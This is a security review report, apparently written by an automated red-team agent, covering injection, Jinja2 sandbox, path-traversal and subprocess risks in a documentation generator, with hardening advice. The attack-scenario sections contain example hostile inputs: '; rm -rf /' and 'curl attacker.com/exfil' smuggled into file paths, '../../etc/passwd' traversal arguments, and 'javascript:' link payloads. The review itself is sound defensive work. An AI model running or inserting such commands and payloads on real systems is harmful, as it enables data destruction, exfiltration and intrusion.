# Attack Surface Report — Jerry Doc Module (PROJ-0037)

> Generated: 2026-03-10
> Analyst: red-vuln (Phase 3 — PROJ-0037 implementation pipeline)
> Scope: Internal security review of `src/docs/` bounded context
> Authorization: Internal development pipeline review
> Classification: Internal

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0 Executive Summary](#l0-executive-summary) | Risk ratings by vector, overall posture, key recommendations |
| [L1 Per-Vector Analysis](#l1-per-vector-analysis) | Code-level analysis of each attack vector |
| [L2 Residual Risk and Recommendations](#l2-residual-risk-and-recommendations) | Residual risk, defense-in-depth gaps, hardening backlog |

---

## L0 Executive Summary

### Vulnerability Count by Severity

| Severity | Count | Vectors |
|----------|-------|---------|
| CRITICAL | 0 | — |
| ~~HIGH~~ LOW | 1 | Jinja2 CVE-2025-27516 (pinned version is patched; constraint widened to `>=3.1.6,<4.0` — RESOLVED) |
| MEDIUM | 2 | Path traversal CWD assumption; unsanitized static YAML fed to templates |
| LOW | 3 | Description field bypass via YAML multi-line scalars (V1); subprocess flag injection (V4); temp-file race window (F6) |
| INFO | 2 | Mode sentinel inconsistency; agent name pattern admits numeric-only names |

### Overall Risk Posture

**LOW-MEDIUM.** The doc module implements meaningful defense-in-depth. The four primary attack vectors are each controlled by a specific mitigation. No critical vulnerabilities are present in the current codebase. The Jinja2 version pin has been widened to `>=3.1.6,<4.0` (Phase 3 hardening), eliminating the previously identified structural risk of being stranded on a vulnerable version.

### Top Exploitable Findings

1. **MEDIUM — Path traversal guard depends on CWD assumption** (`generate_docs_command_handler.py:98`). If `jerry docs generate` is invoked from a subdirectory rather than the repo root, the guard silently permits `--readme ../../etc/passwd` writes. Exploitability is bounded by the user's own file-system permissions, but the contract is fragile.
2. **MEDIUM — Static YAML `skill-examples.yaml` values flow into templates without M-1 sanitization** (`generate_docs_command_handler.py:142`). Content in that file is developer-controlled but unauthenticated from the renderer's perspective. A malicious or misconfigured `skill-examples.yaml` can inject pipe characters, backticks, and raw HTML into the rendered README without any sanitization gate.
3. **LOW — YAML multi-line scalar bypass of M-1 description sanitization** (`skill_extractor.py:136`). A description written as a YAML block scalar containing embedded newlines passes `_sanitize_description` but may break markdown table structure in the rendered output.

### Key Recommendations

1. Enforce CWD at the CLI entry point or validate paths against a config-derived repo root rather than `Path.cwd()`.
2. Apply `_sanitize_description` (or an equivalent strip-and-truncate) to `example` and `features` values loaded from static YAML before they enter the template context.
3. Add a newline-strip step to the sanitization pipeline for all user-controlled text fields used in markdown table cells.
4. ~~Loosen the Jinja2 version constraint to `>=3.1.6,<4.0`~~ **COMPLETED** — Pin widened during Phase 3 hardening.

---

## L1 Per-Vector Analysis

### Vector 1 — YAML Injection via Description Field

**Attack Scenario**

An adversary controls a SKILL.md or agent .md file (e.g., a malicious skill added to a fork, a supply-chain compromise of a skill file, or a developer typo). The description field contains content designed to:

- Break out of YAML parsing (multi-line scalars, block scalars, YAML anchors/aliases)
- Bypass the M-1 HTML/link sanitization
- Inject markdown that corrupts the rendered README table structure

The YAML parsing itself is not done by the doc module — it is delegated to `jerry ast frontmatter` via subprocess, which uses the AST-based parser (H-33 compliance). The doc module only receives the already-parsed Python dict. YAML injection into the parser is therefore out of scope for this module; it is the responsibility of the upstream AST parser.

**Defensive Control**

`skill_extractor.py:136` — `self._sanitize_description(str(raw_description))`

`skill_extractor.py:243-263` — `_sanitize_description` applies:
1. `_HTML_TAG_PATTERN.sub("", text)` — strips all HTML tags
2. `_UNSAFE_LINK_PATTERN.sub(r"\1", sanitized)` — neutralizes `javascript:`, `data:`, `vbscript:` link schemes by replacing the full link with plain text
3. `.strip()[:_MAX_DESCRIPTION_LENGTH]` — truncates to 1024 characters

**Bypass Feasibility Assessment**

*HTML stripping (bypass difficulty: LOW).* The pattern `<[^>]+>` is a well-known incomplete HTML stripper. It does not handle:
- Malformed tags: `< script>alert(1)< /script>` (spaces in tag name)
- Encoded entities: `&#60;script&#62;` passes through unmodified

However, the output is markdown, not HTML rendered in a browser. The downstream consumer is GitHub Flavored Markdown (GFM) in README.md, not a browser executing JavaScript. HTML injection into markdown has no meaningful execution surface in this context; GFM renders `<script>` tags as escaped text. **Risk in this context: LOW.**

*Unsafe link stripping (bypass difficulty: LOW-MEDIUM).* The pattern `_UNSAFE_LINK_PATTERN` uses a negative lookahead `(?!https?://|mailto:|/)` and then requires `(?:[a-zA-Z][a-zA-Z0-9+\-.]*:)` to match a scheme. Crafted payloads:

- `[text](JAVASCRIPT:alert(1))` — scheme is uppercase; the regex pattern does not apply `re.IGNORECASE`. The lookahead `(?!https?://|mailto:|/)` is case-sensitive, and the scheme pattern `[a-zA-Z][a-zA-Z0-9+\-.]*:` matches `JAVASCRIPT:`. The overall pattern would match and strip it. Verified: the regex has no flags set at line 38 of `skill_extractor.py`. The scheme detection portion `[a-zA-Z][a-zA-Z0-9+\-.]*:` matches uppercase schemes. **PASS** for uppercase schemes.
- `[text](javascript%3Aalert(1))` — percent-encoded colon. The pattern checks literal characters and would not match `%3A`. The encoded form passes through as raw text, which is then rendered as a broken or literal link by most markdown renderers — not executable. **Risk: INFO.**
- Multi-line YAML block scalar descriptions containing newlines. `_sanitize_description` calls `.strip()` but does not collapse internal newlines. A description like `"normal text\n| injected | table | row |"` would pass through with the embedded newline, potentially inserting a new row into the generated markdown table cell. **This is the most realistic bypass.** The truncation at 1024 chars limits damage but does not eliminate it.

**Rating: LOW**

The attack surface is materially bounded because: (1) all upstream YAML parsing uses `yaml.safe_load` for static files; (2) frontmatter parsing is delegated to the AST-based jerry tool (not PyYAML directly from user input); (3) the downstream rendering surface is markdown in README.md, not an executable HTML context. The newline injection issue is real but consequence is limited to README corruption, not code execution.

**Recommendation**

Add a newline-collapse step to `_sanitize_description`:

```python
sanitized = sanitized.replace('\n', ' ').replace('\r', ' ')
```

This should occur before the truncation step. Additionally, apply `re.IGNORECASE` to `_UNSAFE_LINK_PATTERN` as a defense-in-depth measure, even though the current case-sensitive logic covers most cases.

---

### Vector 2 — Jinja2 SandboxedEnvironment Escape

**Attack Scenario**

An adversary who controls template variable values (e.g., description, name, or example fields) attempts to break out of the Jinja2 `SandboxedEnvironment` and execute arbitrary Python code. This could achieve file system access, environment variable exfiltration, or network calls.

**Pinned Version Analysis**

`pyproject.toml:40` — `"jinja2>=3.1.6,<4.0"` *(widened from original `>=3.1,<3.2` during Phase 3 hardening)*
`uv.lock:443` — resolved to `jinja2==3.1.6`

CVE-2025-27516 (GHSA-cpwx-vrp4-4pq7) is the most recent sandbox breakout vulnerability in Jinja2. It allows template code to use the `|attr` filter to retrieve a reference to `str.format`, bypassing the sandbox's call interceptors. Affected versions: 3.1.5 and earlier. **Fixed in 3.1.6.**

The pinned version `3.1.6` is the patched release. CVE-2025-27516 is not exploitable against this deployment.

**Template Variable Control Analysis**

Can an attacker control template variable values to inject Jinja2 directives? In Jinja2, template variables interpolated via `{{ variable }}` are treated as data, not as template syntax. Jinja2 does not perform recursive template evaluation on variable values. A description field containing `{{ 7*7 }}` will render as the literal string `{{ 7*7 }}` in the output, not `49`.

Template injection (SSTI) requires the attacker to control the template source itself (the `.jinja2` files), not just the variable values. Template files reside at `.context/templates/docs/` (bootstrap.py:759), which is a repository-controlled path. In the current deployment model (local developer tool, no remote user inputs), an attacker who can modify these files already has full repository write access and the attack vector is moot.

**Custom Filter Analysis**

`_macros.jinja2:27` — `text | truncate(length, True, '...', 0)` uses the built-in `truncate` filter.
`_macros.jinja2:44` — `text | replace('|', '&#124;')` uses the built-in `replace` filter.

No custom filters are registered. The environment uses only Jinja2's built-in filters, all of which are sandboxed. The `|attr` vector from CVE-2025-27516 is patched.

**autoescape=False Analysis**

`jinja2_renderer.py:59` — `autoescape=False`. This is explicitly documented as safe because the output is markdown, not HTML served to a browser. The comment at line 33 is correct: HTML autoescaping converts `<` to `&lt;` etc., which would corrupt the markdown output. The decision is sound for this context.

**Rating: INFO** (for CVE-2025-27516 — patched; no current exploitable path)

**Resolved finding: Version constraint widened during Phase 3 hardening**

`pyproject.toml:40` — Updated from `"jinja2>=3.1,<3.2"` to `"jinja2>=3.1.6,<4.0"`. The structural risk of being locked out of future patches has been eliminated. The `>=3.1.6` lower bound explicitly excludes CVE-2025-27516-affected versions, and the `<4.0` upper bound permits all future 3.x patch and minor releases.

**Rating: LOW** (residual; constraint widened — no structural forward risk remains)

**Resolution (Phase 3 hardening)**

`pyproject.toml:40` updated to `"jinja2>=3.1.6,<4.0"` — see hardening backlog item 1 (DONE). This:
- Locks out the CVE-2025-27516 affected range explicitly via the `>=3.1.6` lower bound
- Permits future 3.x security patches to flow in automatically
- Does not introduce breaking changes (the 3.x API is stable)

---

### Vector 3 — Path Traversal in --readme Flag

**Attack Scenario**

An attacker (or misconfigured CI job) invokes:

```
jerry docs generate --write --readme ../../etc/passwd
jerry docs generate --write --readme /tmp/attacker-controlled-file
```

This could overwrite sensitive files outside the repository if the path traversal guard fails.

**Defensive Control**

`generate_docs_command_handler.py:97-108`:

```python
repo_root = Path.cwd().resolve()
readme_abs = Path(command.readme_path).resolve()
readme_abs.relative_to(repo_root)
```

`Path.resolve()` canonicalizes the path, resolving `..` components and symlinks. `relative_to(repo_root)` raises `ValueError` if `readme_abs` is not under `repo_root`, which is caught and returned as a `PATH_TRAVERSAL` error.

**Bypass Feasibility Assessment**

*Absolute path bypass:* `--readme /etc/passwd` resolves to `/etc/passwd`. `Path.cwd().resolve()` is e.g. `/Users/evorun/workspace/jerry`. `/etc/passwd` is not relative to the CWD. `ValueError` is raised. **Guard works for absolute paths.**

*Directory traversal:* `--readme ../../etc/passwd` from `/Users/evorun/workspace/jerry` resolves to `/Users/evorun/etc/passwd`. Not relative to CWD. **Guard works.**

*Symlink attack:* `--readme valid-subdir/link-to-passwd` where `link-to-passwd` is a symlink to `/etc/passwd`. `Path.resolve()` follows symlinks. The resolved path is `/etc/passwd`, which is not under `repo_root`. **Guard works for symlinks.**

*CWD assumption — the critical weakness:* The guard uses `Path.cwd()` as the trust anchor. This works correctly when `jerry docs generate` is invoked from the repository root (the documented and intended invocation). However:

- If invoked from a subdirectory (e.g., `cd src && jerry docs generate --readme README.md`), `cwd` is `/Users/evorun/workspace/jerry/src`. A path like `--readme ../README.md` would resolve to `/Users/evorun/workspace/jerry/README.md`, which IS relative to `src/`. The path traversal guard would pass this. The write would target the correct file by accident, but the semantic contract is broken — the guard is checking "is the path under `src/`" not "is the path under the repo root."
- More critically, `--readme ../../sensitive-file` would resolve to something potentially outside the intended repo scope, and would only be caught if it escapes the CWD, not the repo root.

The handler comment at line 93 acknowledges this:
> "The path traversal guard assumes the current working directory is the repository root. This is satisfied by the CLI entry point (uv run jerry docs generate) which runs from the repo root."

This is a documented assumption, not a bug, but it is a fragile trust anchor. The assumption holds for normal usage but is not enforced mechanically.

**Rating: MEDIUM**

No current exploit path under documented usage. Fragility exists if the CWD assumption is violated (e.g., in test harnesses, CI configurations, or shell aliases). The `write` mode is the only path that creates a file; `check` and `stdout` modes are read-only and not affected by this finding.

**Recommendation**

Replace the CWD-based trust anchor with a config-derived repo root. Options:

1. **[RECOMMENDED]** Walk upward from `Path(__file__)` looking for a `pyproject.toml` marker to locate the repo root deterministically. This is the preferred approach: deterministic, no new CLI parameters, no user configuration needed, and consistent with how Python packaging tools discover project roots.
2. Accept a `--repo-root` parameter that is set by the CI configuration.
3. Encode the allowed write path as a constant (`README.md` at the literal repo root) with no user-overridable path — since `--readme` only serves development ergonomics and the real use case is always the root README.

---

### Vector 4 — Subprocess Injection in AstFrontmatterReader

**Attack Scenario**

An adversary crafts a file path containing shell metacharacters:

```
skill_file = "skills/evil-skill/SKILL.md; rm -rf /"
skill_file = "skills/evil-skill/SKILL.md && curl attacker.com/exfil"
```

If the subprocess call uses `shell=True` or string interpolation, this could execute arbitrary shell commands.

**Defensive Control**

`ast_frontmatter_reader.py:57-62`:

```python
result = subprocess.run(
    ["uv", "run", "jerry", "ast", "frontmatter", str(file_path)],
    capture_output=True,
    text=True,
    timeout=30,
)
```

The call uses list-form arguments (not a shell string). With `shell=False` (the default when a list is passed), the OS `execve` syscall is used directly. The file path becomes a literal argument to the `jerry` process with no shell interpolation. Shell metacharacters in the path string are passed as-is to `jerry ast frontmatter` as the `file_path` argument.

**Bypass Feasibility Assessment**

*Shell injection:* Not possible. `shell=False` is in effect. The list form `["uv", "run", "jerry", "ast", "frontmatter", str(file_path)]` is passed to `execve` without shell processing. A path containing `; rm -rf /` is passed as the literal string `"skills/foo/SKILL.md; rm -rf /"` to the `jerry` process, which will correctly report file not found. No shell interpretation occurs.

*Argument injection:* With `shell=False` and a list, there is no argument splitting. `str(file_path)` is always a single argument regardless of spaces or special characters in the path.

*Path traversal into subprocess:* The subprocess receives the file path as-is. The `jerry ast frontmatter` command presumably opens the file by path. If an attacker can pass a crafted path like `--help` or `--json /etc/passwd` to the subprocess, there could be flag injection. However:
- `str(file_path)` is passed as a positional argument (6th element in the list, after `frontmatter`).
- If the `jerry ast frontmatter` subcommand uses a positional-only argument parser, the value is not interpreted as a flag.
- Paths beginning with `-` could be misinterpreted as flags by the argparse-based subcommand. E.g., a file named `-f` or `--help` passed as a path argument could trigger help output rather than frontmatter extraction.

However, attacker control over file paths in `skills/*/SKILL.md` requires write access to the repository, at which point the attacker already has a higher-privilege vector.

*Timeout as DoS vector:* `timeout=30` limits the blast radius of a hung subprocess. A malicious SKILL.md file that causes the AST parser to infinite-loop would be killed after 30 seconds, raising `RuntimeError` which is caught at the caller level (`skill_extractor.py:105`) and the file is skipped with a warning.

**Rating: LOW**

No shell injection is possible. The list-form subprocess call is correct and effective. The only residual concern is the flag-injection edge case for file paths beginning with `-`, which is mitigated by the fact that such paths are not valid on most filesystems and would not exist in a normal skills directory.

**Recommendation**

Add a path component validation in `SkillExtractor._extract_skill` or `AstFrontmatterReader.read_frontmatter` that rejects any path whose filename component begins with `-`. This closes the theoretical flag-injection risk at negligible cost:

```python
if Path(file_path).name.startswith('-'):
    raise ValueError(f"Invalid file path: filename must not begin with '-': {file_path}")
```

---

### Additional Findings

#### Finding 5 — Unsanitized Static YAML Values in Template Context (MEDIUM)

**Location:** `generate_docs_command_handler.py:142-150`

The `example` field passed to the template context is sourced from `skill-examples.yaml` via `self._load_yaml()`. This value bypasses all M-1 sanitization applied to SKILL.md description fields.

In `skills-table.md.jinja2:5`, the value is passed through `escape_pipe` (which only replaces `|` with `&#124;`) but receives no HTML stripping, no unsafe link removal, and no length truncation.

Similarly, `features.yaml` values (`title` and `description`) are loaded at line 134 and placed directly into the template context at line 157, passing through only `escape_pipe`.

The files are developer-controlled, making this a LOW probability exploitation path. However, the inconsistency creates a correctness and defense-in-depth gap: a developer who adds a long example value with HTML tags or backtick injection will see them rendered raw into the README.

**Rating: MEDIUM** (defense-in-depth gap; probability is LOW but consistent sanitization is a hygiene requirement)

**Recommendation:** Apply `_sanitize_description` (or a similarly named utility function extracted to be reusable) to all string values loaded from static YAML before they enter the template context.

---

#### Finding 6 — Temporary File Race Window During Atomic Write (LOW)

**Location:** `generate_docs_command_handler.py:281-291`

The M-3 atomic write pattern creates a `.tmp` file in the same directory as the README, writes to it, then uses `os.replace()` for atomic rename. This is the correct POSIX atomic write pattern.

Residual risk: between `NamedTemporaryFile` creation and `os.replace()`, a brief window exists where the `.tmp` file is present on disk with the new README content. On a multi-user system, another process could read the `.tmp` file during this window.

In practice: the jerry tool is a single-developer CLI running on a developer workstation. The `.tmp` file is in the repository directory, which is typically user-owned. The window is on the order of milliseconds.

**Rating: LOW** (theoretical on single-user workstations; real on shared CI systems with concurrent pipeline jobs)

**Recommendation:** Set explicit permissions on the temporary file (e.g., `os.chmod(temp_path, 0o600)` before the rename) to ensure the file is readable only by the owner during the write window.

---

#### Finding 7 — Mode Sentinel Inconsistency (INFO)

**Location:** `main.py:737-741`

The CLI uses a local `"stdout"` sentinel for the no-write case, then maps it to `None` before constructing `GenerateDocsCommand`. The mapping is correct, but the dual representation (`"stdout"` in CLI context vs. `None` in handler context) is a fragile convention. If a future developer adds a code path that creates a `GenerateDocsCommand` with `mode="stdout"`, the handler's `valid_modes` check at line 111-112 would reject it as `INVALID_MODE`.

**Rating: INFO** (not exploitable; a future correctness risk)

**Recommendation:** Replace the local `"stdout"` sentinel with `None` at the point of CLI argument resolution, eliminating the mapping step entirely.

---

#### Finding 8 — Agent Name Pattern Admits Numeric-Dominant Names (INFO)

**Location:** `skill_extractor.py:32`

`_AGENT_NAME_PATTERN = re.compile(r"^[a-z][a-z0-9-]*$")` requires a lowercase letter as the first character but permits subsequent characters to be entirely digits or hyphens (e.g., `a-0-0-0`). This is consistent with DNS label conventions and not exploitable, but deviates from the `{skill-prefix}-{function}` naming standard in `agent-development-standards.md`.

**Rating: INFO** (naming convention gap, not a security finding)

---

## L2 Residual Risk Assessment and Recommendations

### Residual Risk Summary

| Finding | Rating | Residual Risk After Mitigations |
|---------|--------|---------------------------------|
| V2: Jinja2 version constraint | ~~HIGH~~ **LOW** (RESOLVED) | Pin widened to `>=3.1.6,<4.0`; structural risk eliminated |
| V3: CWD-anchored path traversal guard | MEDIUM | Low exploitability under normal usage; fragile in CI/test contexts |
| F5: Unsanitized static YAML in templates | MEDIUM | Low exploitability; defense-in-depth gap |
| V1: Description newline injection | LOW | README corruption only; no code execution |
| V4: Subprocess flag injection | LOW | Requires malformed filename; mitigated by filesystem conventions |
| F6: Temp file race window | LOW | Theoretical on single-user systems |
| F7: Mode sentinel inconsistency | INFO | Future correctness risk |
| F8: Agent name pattern | INFO | Naming convention gap |

### Defense-in-Depth Gaps

1. **Sanitization is inconsistently applied.** M-1 applies to SKILL.md and agent .md description fields but not to `skill-examples.yaml` or `features.yaml` values. The boundary is implicit (frontmatter reader output is sanitized; static YAML loader output is not). This gap should be explicit in code and documented in the spec.

2. **CWD as security boundary.** Using `Path.cwd()` as the trust anchor for path traversal prevention is operationally sound but architecturally fragile. A repository-root marker (e.g., `pyproject.toml` presence) is a stronger invariant.

3. **No output length bound on rendered sections.** Once the template renders a section, there is no cap on the total length of content injected into the README. A skills directory with thousands of skill files would produce a README of arbitrary size. This is not a security vulnerability but is a correctness boundary condition.

4. **`examples` dict lookup falls through to empty string silently.** `generate_docs_command_handler.py:142` — `example = examples.get(skill.name, "")`. A skill with no entry in `skill-examples.yaml` produces an empty Example column cell, silently. No warning is logged. This should produce a logged INFO so skill authors know to populate the file.

### Hardening Backlog (Priority Order)

| Priority | Action | File | Effort |
|----------|--------|------|--------|
| ~~1~~ | ~~Change Jinja2 pin to `>=3.1.6,<4.0`~~ | ~~`pyproject.toml:40`~~ | **DONE** (Phase 3 hardening) |
| 2 | Apply `_sanitize_description` to all YAML-loaded string values before template context | `generate_docs_command_handler.py:141-158` | 30 min |
| 3 | Add newline-collapse to `_sanitize_description` | `skill_extractor.py:260` | 10 min |
| 4 | Replace CWD trust anchor with repo-root marker detection | `generate_docs_command_handler.py:98` | 1 hr |
| 5 | Add `os.chmod(temp_path, 0o600)` before `os.replace()` | `generate_docs_command_handler.py:290` | 5 min |
| 6 | Add filename-begins-with-dash guard in `AstFrontmatterReader` | `ast_frontmatter_reader.py:53` | 10 min |
| 7 | Eliminate `"stdout"` sentinel; use `None` directly | `main.py:737-741` | 10 min |

### ATT&CK Technique Mappings

| Vector | ATT&CK Technique | Notes |
|--------|-----------------|-------|
| V1 Description injection | T1565.001 (Stored Data Manipulation) | README corruption; no code execution surface |
| V2 Jinja2 SSTI (historical) | T1059.006 (Python execution) | CVE-2025-27516 patched; not currently applicable |
| V3 Path traversal | T1083 (File and Directory Discovery) + T1565.001 | Write scope escape under abnormal CWD |
| V4 Subprocess injection | T1059 (Command and Scripting Interpreter) | Not achievable with current `shell=False` |

---

## References

- [CVE-2025-27516 — Jinja2 sandbox breakout via attr filter](https://github.com/advisories/GHSA-cpwx-vrp4-4pq7)
- [NVD CVE-2025-27516](https://nvd.nist.gov/vuln/detail/CVE-2025-27516)
- [Snyk SNYK-PYTHON-JINJA2-9292516](https://security.snyk.io/vuln/SNYK-PYTHON-JINJA2-9292516)
- PTES Vulnerability Analysis Phase — [http://www.pentest-standard.org/](http://www.pentest-standard.org/)
- OWASP Testing Guide v4.2 — Input Validation Testing (OTG-INPVAL)
- NIST SP 800-115 Chapter 5 — Vulnerability Analysis

---

*Agent: red-vuln v1.0.0*
*Constitutional Compliance: P-003 (no recursive subagents), P-020 (user authority), P-022 (no deception)*
*Output Level: L0 + L1 + L2 per agent output requirements (P-002)*
